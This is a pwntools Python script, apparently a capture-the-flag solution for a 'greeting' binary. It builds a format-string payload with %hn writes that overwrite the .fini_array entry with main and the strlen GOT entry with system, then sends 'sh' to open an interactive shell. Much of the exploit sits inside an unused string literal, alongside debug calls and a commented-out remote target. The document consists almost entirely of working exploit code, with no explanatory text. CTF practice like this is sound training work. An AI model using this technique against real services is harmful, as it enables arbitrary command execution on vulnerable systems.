from pwn import *
p=process("./greeting")
# p=remote("111.198.29.45","52275")
context.log_level='debug'
context.terminal=['tmux','split','-h']
p.recv()
main = 0x080485ed
fini = 0x08049934
system = 0x08048490
strlen = 0x8049a54
gdb.attach(p,"b*0x0804864F")
payload="AA"+p32(0x08049A54)+"%12$hhn"
p.sendline("1")
p.recv()
'''
exploit = 'AA'
exploit += pack(0x08049936)
exploit += pack(0x08049a56)
exploit += pack(0x08049a54)
exploit += pack(0x08049934)
# gdb.attach(p,"b*0x08048628")
pause()
first = 0x804 - 0x1c - 0x8 #print 0x804 bytes before 0x8049936 
second = 0x8490 - 0x0804
third = 0x85ed - 0x8490
exploit += '%' + str(first) +  'x%12$hn'
exploit += '%13$hn'
exploit += '%' + str(second) + 'x%14$hn'
exploit += '%' + str(third) + 'x%15$hn'
exploit += ""
# print p.recvuntil('... ')
# gdb.attach(p,"b*0x0804864F")
p.sendline(exploit)
# print p.recvuntil('... ')
p.sendline("sh")
p.interactive()
'''